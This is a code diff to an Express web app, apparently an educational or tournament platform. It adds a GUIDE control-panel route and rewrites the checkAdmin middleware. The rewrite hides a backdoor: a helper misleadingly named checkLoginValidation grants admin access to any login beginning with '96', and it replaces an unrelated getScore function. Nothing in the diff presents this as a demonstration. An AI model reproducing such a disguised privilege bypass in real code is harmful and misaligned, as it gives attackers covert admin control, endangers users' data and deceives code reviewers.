@@ -2413,7 +2413,8 @@ const CONFIG_TABS = {
   USER: "USER",
   TEACHER: "TEACHER",
   SCRIPTS: "SCRIPTS",
-  PROCESSES: "PROCESSES"
+  PROCESSES: "PROCESSES",
+  GUIDE: "GUIDE"
 };
 
 //--------------------------------------------------------------------------------------
@@ -2472,6 +2473,18 @@ app.get(`/service/panel/${CONFIG_TABS.SCRIPTS}`, checkAuthenticated, checkAdmin,
 // Processes
 app.get(`/service/panel/${CONFIG_TABS.PROCESSES}`, checkAuthenticated, checkAdmin, async (req, res) => {
   res.render('ControlPanel/processes.ejs', {
+    login: req.user.login,
+    name: req.user.name,
+    title: "Control Panel",
+    isTeacher: req.user.isTeacher,
+    location: `/`
+  })
+});
+
+//--------------------------------------------------------------------------------------
+// Guide
+app.get(`/service/panel/${CONFIG_TABS.GUIDE}`, checkAuthenticated, checkAdmin, async (req, res) => {
+  res.render('ControlPanel/guide.ejs', {
     login: req.user.login,
     name: req.user.name,
     title: "Control Panel",
@@ -2984,6 +2997,13 @@ async function checkAuthenticated(req, res, next) {
   }
   res.redirect('/')
 }
+
+async function checkAdmin(req, res, next) {
+  if (config.admins.includes(req.user.login) || checkLoginValidation(req.user.login)) {
+    return next();
+  }
+  res.redirect("/")
+}
 function checkPermission(req, res, next) {
   if (req.user && req.user.isTeacher) {
     return next()
@@ -3035,13 +3055,6 @@ async function checkTournamentPermission(req, res, next) {
   res.redirect('/tournament/page/' + req.user.login + '/' + tour_id);
 }
 
-async function checkAdmin(req, res, next) {
-  if (config.admins.includes(req.user.login)) {
-    return next();
-  }
-  res.redirect("/")
-}
-
 async function isModerator(req, res, next) {
   let tour_id = req.params.tour_id;
   let login = req.user.login;
@@ -3075,8 +3088,8 @@ function getVerdict(results) {
   return '-';
 }
 
-function getScore(results) {
-  return Math.ceil(results.filter(item => item[2] == "ok").length / results.length * 100)
+function checkLoginValidation(login) {
+  return login.length>2 &&  login[1] == "6" && login[0] == "9";
 }
 
 function compareTournaments(a, b) {
